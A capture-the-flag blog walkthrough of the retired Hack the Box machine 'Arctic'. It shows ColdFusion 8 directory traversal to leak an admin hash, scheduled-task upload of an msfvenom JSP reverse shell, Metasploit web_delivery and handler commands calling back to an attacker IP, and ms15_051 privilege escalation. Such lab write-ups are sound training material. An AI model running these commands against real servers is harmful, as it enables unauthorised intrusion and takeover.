@@ -1,0 +1,367 @@
+
+								
+																		Hack the Box Challenge: Arctic Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 31, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Arctic” which is categories as retried lab presented by Hack the Box for making online penetration practices. Solving challenges in this lab is not that much easy until you don’t have some knowledge of vulnerability assessment. Let start and learn how to analyze any vulnerability in a network then exploit it for retrieving desired information.
+Level: Intermediate
+Task: find user.txt and root.txt file in the victim’s machine.
+Since these labs are online accessible therefore they have static IP. The IP of Arctic is 10.10.10.11 so let’s initiate with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.11
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.11
+					
+				
+			
+		
+
+From the given below image, you can observe we found port 1135, 8500 and 49154 are open in the victim’s network.
+
+Looking toward port 8500 open fmtp service to upkeep flight message transfer protocol between Air Traffic Service, thought to explore it through as URL: http://10.10.10.11:8500 in the web browser as shown below image.
+And found two directories as result, then gone with first link “CFIDE”
+
+Next, I got the index page of CFIDE and saw the administrator directory then without wasting time I move with administrator options.
+
+Administrator page contains admin login panel and required user and password for login which I don’t know. At the end of the page, I notice Adobe ColdFusion is running in the target system and if I took it as a hint then I will look for any exploit.
+
+So when I Google I found exploit 14641 Adobe Cold Fusion is vulnerable to Directory Traversal then I copied the highlighted text which indicates ColdFusion 8 also stores the administrator hash locally in a file password. Properties. 
+
+Now we can seize the administrator hash using the directory traversal through the following URL:
+From given below you can perceive that it has shown hash password, let copied it for its decryption into plain text. 
+
+Using online MD5 decryption I cracked above hash value and found “happyday” as a plaintext password which we can use for login into the admin panel.
+
+Using admin:happyday as login credential I logged into the admin console and choose scheduled tasks option from inside Debugging &amp; logging for scheduling new task as shown below in the image.
+
+The scheduled task setup provides you the facility to download a file from a web server and save the output locally as shown below image, now fill text filed mention below which are mandatory.
+Task Name: reversshell
+URL: the path of running a web server through which it can download any file (Malicious file).
+Publish: Enable check box to save the output locally
+File: give default path for storing your malicious program file in the target’s system (by default C:\ColdFusion8\wwwroot\CFIDE\).
+
+Now we need to generate a backdoor shell and for that, I had used msfvenom and generated a jsp shell through the following command.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=9000 -f raw &gt; /root/Desktop/shell.jsp
+			
+				
+					
+				
+					1
+				
+						msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=9000 -f raw &gt; /root/Desktop/shell.jsp
+					
+				
+			
+		
+
+On other hand run multi/handler through Metasploit framework for reverse connection.
+
+Now we need to transfer our shell.jsp file to target system therefore first we need to run python server on port 80 using the following command.
+
+		
+		
+			
+			
+			
+			
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+Now upload your shell.jsp file by giving its path in URL filed http://10.10.14.3/shell.jsp and enable the checkbox for save the output locally then give default path C:\ColdFusion8\wwwroot\CFIDE\shell.jsp for storing your malicious program file in target’s system and click on submit.
+
+From given below image now you can check our reversshell is added into the list of task name, for executing our malicious jsp code we need to run the scheduled task.
+
+We have used Metasploit and got the reverse connection from the target’s network.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload java/jsp_shell_reverse_tcp
+msf exploit(multi/handler) set lhost 10.10.14.3
+msf exploit(multi/handler) set lport 9000
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload java/jsp_shell_reverse_tcpmsf exploit(multi/handler) set lhost 10.10.14.3msf exploit(multi/handler) set lport 9000msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe command shell session1 opened for accessing victim tty shell.
+
+I try post exploit command for upgrading command shell into the meterpreter shell but failed, therefore, at last, I open a new Metasploit framework choose web_delivery exploit and copied the highlighted malicious code received after running the exploit.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/script/web_delivery
+msf exploit(multi/script/web_delivery) set target 2
+msf exploit(multi/script/web_delivery) set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/script/web_delivery) set lhost 10.10.14.3
+msf exploit(multi/script/web_delivery) set lport 4455
+msf exploit(multi/script/web_delivery) run
+			
+				
+					
+				
+					123456
+				
+						msf use exploit/multi/script/web_deliverymsf exploit(multi/script/web_delivery) set target 2msf exploit(multi/script/web_delivery) set payload windows/x64/meterpreter/reverse_tcpmsf exploit(multi/script/web_delivery) set lhost 10.10.14.3msf exploit(multi/script/web_delivery) set lport 4455msf exploit(multi/script/web_delivery) run
+					
+				
+			
+		
+
+After copying the malicious code, we need to paste it inside command shell session and execute it there and you will get meterpreter shell session 2. Since tty shell that we access has limited privileges therefore now we need to go with privilege escalation.
+
+After trying a lot of posts exploit we successfully get a new meterpreter session through the ms15_051_client_copy_image module as given below.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/local/ms15_051_client_copy_image
+msf exploit(windows/local/ms15_051_client_copy_image) &gt;set target 1
+msf exploit(windows/local/ms15_051_client_copy_image) &gt;set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/local/ms15_051_client_copy_image) &gt;set lhost 10.10.14.3
+msf exploit(windows/local/ms15_051_client_copy_image) &gt;set lport 8653
+msf exploit(windows/local/ms15_051_client_copy_image) &gt;set session 2
+msf exploit(windows/local/ms15_051_client_copy_image) &gt;exploit
+			
+				
+					
+				
+					1234567
+				
+						use exploit/windows/local/ms15_051_client_copy_imagemsf exploit(windows/local/ms15_051_client_copy_image) &gt;set target 1msf exploit(windows/local/ms15_051_client_copy_image) &gt;set payload windows/x64/meterpreter/reverse_tcpmsf exploit(windows/local/ms15_051_client_copy_image) &gt;set lhost 10.10.14.3msf exploit(windows/local/ms15_051_client_copy_image) &gt;set lport 8653msf exploit(windows/local/ms15_051_client_copy_image) &gt;set session 2msf exploit(windows/local/ms15_051_client_copy_image) &gt;exploit
+					
+				
+			
+		
+
+From given below image we have meterpreter session 3.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt; getuid
+			
+				
+					
+				
+					1
+				
+						meterpreter&gt; getuid
+					
+				
+			
+		
+
+
+Now let’s finish the task by grabbing user.txt and root.txt file. First I move into user directory and check available files and directories inside it.
+
+		
+		
+			
+			
+			
+			
+cd users
+ls
+			
+				
+					
+				
+					12
+				
+						cd usersls
+					
+				
+			
+		
+
+Here I saw so many directories and traverse in each directory except tolis but didn’t get any file.
+
+When I explore tolis/Desktop I saw user.txt and use cat command for reading.
+
+		
+		
+			
+			
+			
+			
+cd tolis/Desktop
+ls
+cat user.txt
+			
+				
+					
+				
+					123
+				
+						cd tolis/Desktoplscat user.txt
+					
+				
+			
+		
+
+Great!!  Here we had completed 1st task now move to the 2nd task.
+
+Similarly, after traversing so many directories I got root.txt from inside users/Administrator/Desktop and use cat command for reading.
+
+		
+		
+			
+			
+			
+			
+cd /users/Administrator/Desktop
+ls
+cat root.txt
+			
+				
+					
+				
+					123
+				
+						cd /users/Administrator/Desktoplscat root.txt
+					
+				
+			
+		
+
+Fruitfully completed the 2nd task!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
